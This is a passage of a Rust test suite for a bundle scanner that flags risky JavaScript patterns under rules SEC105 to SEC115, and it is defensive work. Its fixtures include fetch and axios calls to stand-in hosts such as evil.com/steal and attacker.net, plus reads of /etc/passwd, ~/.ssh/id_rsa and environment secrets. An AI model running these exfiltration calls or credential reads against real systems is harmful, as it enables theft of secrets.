    // -----------------------------------------------------------------------
    // SEC105 — native addons (two-pass)
    // -----------------------------------------------------------------------

    #[test]
    fn sec105_require_bindings_with_dot_node() {
        let content = r#"var b = require("bindings"); b("native.node");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC105"),
            "findings: {findings:?}"
        );
        assert!(is_blocked(&findings));
    }

    #[test]
    fn sec105_require_ffi_napi_with_dot_node() {
        let content = r#"var ffi = require("ffi-napi"); ffi.Library("lib.node");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC105"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec105_import_bindings_with_dot_node() {
        let content = r#"import bindings from "bindings"; const x = bindings("mod.node");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC105"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec105_no_signal_skips_rule() {
        let findings = scan_bundle(r#"require("./addon.node");"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC105"),
            "SEC105 should not fire without signal: {findings:?}"
        );
    }

    // -----------------------------------------------------------------------
    // SEC106 — module monkey-patching (two-pass)
    // -----------------------------------------------------------------------

    #[test]
    fn sec106_require_module_with_load_override() {
        let content = r#"var Module = require("module"); Module._load = function() {};"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC106"),
            "findings: {findings:?}"
        );
        assert!(is_blocked(&findings));
    }

    #[test]
    fn sec106_import_module_with_resolve_override() {
        let content = r#"import Module from "module"; Module._resolveFilename = function() {};"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC106"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec106_require_cache_assignment() {
        let content = r#"var Module = require("module"); require.cache["key"] = null;"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC106"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec106_delete_require_cache() {
        let content = r#"var Module = require("module"); delete require.cache;"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC106"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec106_bracket_load_override() {
        let content = r#"var M = require("module"); Module["_load"] = function() {};"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC106"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec106_no_signal_skips_rule() {
        let findings = scan_bundle(r#"Module._load = function() {};"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC106"),
            "SEC106 should not fire without module import: {findings:?}"
        );
    }

    // -----------------------------------------------------------------------
    // SEC107 — inspector module (two-pass)
    // -----------------------------------------------------------------------

    #[test]
    fn sec107_require_inspector_with_open() {
        let content = r#"var inspector = require("inspector"); inspector.open(9229);"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC107"),
            "findings: {findings:?}"
        );
        assert!(is_blocked(&findings));
    }

    #[test]
    fn sec107_require_node_inspector_with_wait() {
        let content =
            r#"var inspector = require("node:inspector"); inspector.waitForDebugger();"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC107"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec107_esm_import_inspector_with_open() {
        let content = r#"import inspector from "inspector"; inspector.open();"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC107"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec107_inspector_url() {
        let content = r#"var inspector = require("inspector"); console.log(inspector.url());"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC107"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec107_bracket_open() {
        let content = r#"var inspector = require("inspector"); inspector["open"](9229);"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC107"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec107_no_signal_skips_rule() {
        let findings = scan_bundle(r#"inspector.open(9229);"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC107"),
            "SEC107 should not fire without import: {findings:?}"
        );
    }

    // -----------------------------------------------------------------------
    // SEC108 — external URLs (two-pass, warn)
    // -----------------------------------------------------------------------

    #[test]
    fn sec108_require_https_with_url() {
        // Use a trusted godaddy.com domain so SEC112 (block) does not also fire.
        let content =
            r#"var https = require("https"); https.get("https://api.godaddy.com/v1/");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC108"),
            "findings: {findings:?}"
        );
        assert!(!is_blocked(&findings), "SEC108 should be warn, not block");
    }

    #[test]
    fn sec108_import_axios_with_url() {
        let content = r#"import axios from "axios"; axios.post("https://evil.com/data", {});"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC108"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec108_fetch_with_https_url() {
        let content = r#"import { request } from "https"; fetch("https://api.example.com");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC108"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec108_http_url() {
        let content = r#"var http = require("http"); http.get("http://example.com");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC108"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec108_new_url_constructor() {
        let content =
            r#"var http = require("http"); const u = new URL("https://api.example.com");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC108"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec108_no_signal_skips_rule() {
        let findings =
            scan_bundle(r#"const url = "https://api.example.com";"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC108"),
            "SEC108 should not fire without http/axios import: {findings:?}"
        );
    }

    // -----------------------------------------------------------------------
    // SEC109 — large encoded blobs (warn, no signal)
    // -----------------------------------------------------------------------

    #[test]
    fn sec109_large_base64_buffer_from() {
        let b64 = "A".repeat(210);
        let content = format!(r#"const x = Buffer.from("{b64}", "base64");"#);
        let findings = scan_bundle(&content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC109"),
            "findings: {findings:?}"
        );
        // SEC113 (block) also fires on base64 content — just verify SEC109 itself is warn.
        assert!(
            findings
                .iter()
                .filter(|f| f.rule_id == "SEC109")
                .all(|f| f.severity == Severity::Warn),
            "SEC109 findings should have warn severity"
        );
    }

    #[test]
    fn sec109_large_base64_atob() {
        let b64 = "B".repeat(210);
        let content = format!(r#"const x = atob("{b64}");"#);
        let findings = scan_bundle(&content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC109"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec109_large_hex_buffer_from() {
        let hex = "a".repeat(410);
        let content = format!(r#"const x = Buffer.from("{hex}", "hex");"#);
        let findings = scan_bundle(&content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC109"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec109_short_base64_no_match() {
        let b64 = "A".repeat(50);
        let content = format!(r#"const x = Buffer.from("{b64}", "base64");"#);
        let findings = scan_bundle(&content, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC109"),
            "short base64 should not match SEC109: {findings:?}"
        );
    }

    #[test]
    fn sec109_short_hex_no_match() {
        let hex = "a".repeat(100);
        let content = format!(r#"const x = Buffer.from("{hex}", "hex");"#);
        let findings = scan_bundle(&content, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC109"),
            "short hex should not match SEC109: {findings:?}"
        );
    }

    // -----------------------------------------------------------------------
    // SEC110 — sensitive fs/net/env ops (two-pass, warn)
    // -----------------------------------------------------------------------

    #[test]
    fn sec110_require_net_with_connect() {
        let content = r#"var net = require("net"); net.connect(80, "host");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC110"),
            "findings: {findings:?}"
        );
        assert!(!is_blocked(&findings), "SEC110 should be warn");
    }

    #[test]
    fn sec110_require_node_net_with_create_connection() {
        let content = r#"var net = require("node:net"); net.createConnection(80, "host");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC110"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec110_import_fs_with_process_env_bracket() {
        let content = r#"import fs from "fs"; const key = process.env["API_KEY"];"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC110"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec110_process_env_dot_notation() {
        let content = r#"var fs = require("fs"); const val = process.env.SECRET;"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC110"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec110_etc_passwd() {
        let content = r#"var fs = require("fs"); fs.readFileSync("/etc/passwd");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC110"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec110_ssh_path() {
        let content = r#"var fs = require("fs"); fs.readFileSync("~/.ssh/id_rsa");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC110"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec110_readfile_env() {
        let content = r#"var fs = require("fs"); fs.readFile("config.env", "utf8", cb);"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC110"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec110_readfile_sync_env() {
        let content = r#"var fs = require("node:fs"); fs.readFileSync("app.env");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC110"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec110_no_signal_skips_rule() {
        let findings = scan_bundle(r#"const val = process.env.KEY;"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC110"),
            "SEC110 should not fire without net/fs import: {findings:?}"
        );
    }

    // -----------------------------------------------------------------------
    // SEC111 — destructive fs operations (two-pass, block)
    // -----------------------------------------------------------------------

    #[test]
    fn sec111_require_fs_with_unlink() {
        let content = r#"var fs = require("fs"); fs.unlink("/tmp/file", cb);"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC111"),
            "findings: {findings:?}"
        );
        assert!(is_blocked(&findings));
    }

    #[test]
    fn sec111_unlink_sync() {
        let content = r#"var fs = require("node:fs"); fs.unlinkSync("/tmp/file");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC111"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec111_rmdir() {
        let content = r#"var fs = require("fs"); fs.rmdir("/tmp/dir", cb);"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC111"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec111_rm_via_esm_import() {
        let content = r#"import fs from "fs"; fs.rm("/tmp/dir", { recursive: true }, cb);"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC111"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec111_fs_promises_with_unlink() {
        let content = r#"import { unlink } from "fs/promises"; await unlink("/tmp/file");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC111"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec111_no_signal_skips_rule() {
        let findings = scan_bundle(r#"fs.unlink("/tmp/file", cb);"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC111"),
            "SEC111 should not fire without fs import: {findings:?}"
        );
    }

    // -----------------------------------------------------------------------
    // SEC112 — untrusted domain requests (no signal, block)
    // -----------------------------------------------------------------------

    #[test]
    fn sec112_untrusted_domain_blocked() {
        let findings = scan_bundle(r#"fetch("https://evil.com/steal");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC112"),
            "findings: {findings:?}"
        );
        assert!(is_blocked(&findings));
    }

    #[test]
    fn sec112_http_untrusted_blocked() {
        let findings = scan_bundle(r#"fetch("http://attacker.net/data");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC112"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec112_trusted_godaddy_subdomain_allowed() {
        let findings =
            scan_bundle(r#"fetch("https://api.godaddy.com/v1/products");"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC112"),
            "godaddy.com subdomain should be trusted: {findings:?}"
        );
    }

    #[test]
    fn sec112_trusted_godaddy_root_allowed() {
        let findings = scan_bundle(r#"fetch("https://godaddy.com/path");"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC112"),
            "godaddy.com root should be trusted: {findings:?}"
        );
    }

    #[test]
    fn sec112_trusted_localhost_with_port_allowed() {
        let findings = scan_bundle(r#"fetch("https://localhost:3000/api");"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC112"),
            "localhost should be trusted: {findings:?}"
        );
    }

    #[test]
    fn sec112_trusted_127_0_0_1_allowed() {
        let findings = scan_bundle(r#"fetch("http://127.0.0.1/api");"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC112"),
            "127.0.0.1 should be trusted: {findings:?}"
        );
    }

    #[test]
    fn sec112_godaddy_lookalike_blocked() {
        let findings = scan_bundle(r#"fetch("https://godaddy.com.evil.net/");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC112"),
            "godaddy.com.evil.net should not be trusted: {findings:?}"
        );
    }

    // -----------------------------------------------------------------------
    // SEC113 — any encoded payload (no signal, block)
    // -----------------------------------------------------------------------

    #[test]
    fn sec113_atob_blocked() {
        let findings = scan_bundle(r#"const x = atob("aGVsbG8=");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC113"),
            "findings: {findings:?}"
        );
        assert!(is_blocked(&findings));
    }

    #[test]
    fn sec113_buffer_from_base64_blocked() {
        let findings =
            scan_bundle(r#"const x = Buffer.from("shortval", "base64");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC113"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec113_buffer_from_hex_blocked() {
        let findings =
            scan_bundle(r#"const x = Buffer.from("deadbeef", "hex");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC113"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec113_buffer_from_utf8_allowed() {
        let findings =
            scan_bundle(r#"const x = Buffer.from("hello world", "utf8");"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC113"),
            "utf8 encoding should not match SEC113: {findings:?}"
        );
    }

    // -----------------------------------------------------------------------
    // SEC114 — debugger statement (no signal, block)
    // -----------------------------------------------------------------------

    #[test]
    fn sec114_debugger_blocked() {
        let findings = scan_bundle("function x() { debugger; return 1; }", "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC114"),
            "findings: {findings:?}"
        );
        assert!(is_blocked(&findings));
    }

    #[test]
    fn sec114_debugger_word_boundary() {
        let findings = scan_bundle(r#"const debuggerMode = true;"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC114"),
            "debuggerMode should not match SEC114: {findings:?}"
        );
    }

    // -----------------------------------------------------------------------
    // SEC115 — dynamic require/import (no signal, block)
    // -----------------------------------------------------------------------

    #[test]
    fn sec115_dynamic_require_blocked() {
        let findings = scan_bundle(r#"const m = require(userInput);"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC115"),
            "findings: {findings:?}"
        );
        assert!(is_blocked(&findings));
    }

    #[test]
    fn sec115_dynamic_import_blocked() {
        let findings = scan_bundle(r#"const m = await import(dynamicPath);"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC115"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec115_static_require_allowed() {
        let findings = scan_bundle(r#"const m = require("./module");"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC115"),
            "static string require should not match SEC115: {findings:?}"
        );
    }

    #[test]
    fn sec115_static_import_allowed() {
        let findings = scan_bundle(r#"const m = await import("./module");"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC115"),
            "static string import should not match SEC115: {findings:?}"
        );
    }

    #[test]
    fn sec115_import_meta_not_matched() {
        let findings = scan_bundle(r#"const url = import.meta.url;"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC115"),
            "import.meta.url should not match SEC115: {findings:?}"
        );
    }
}
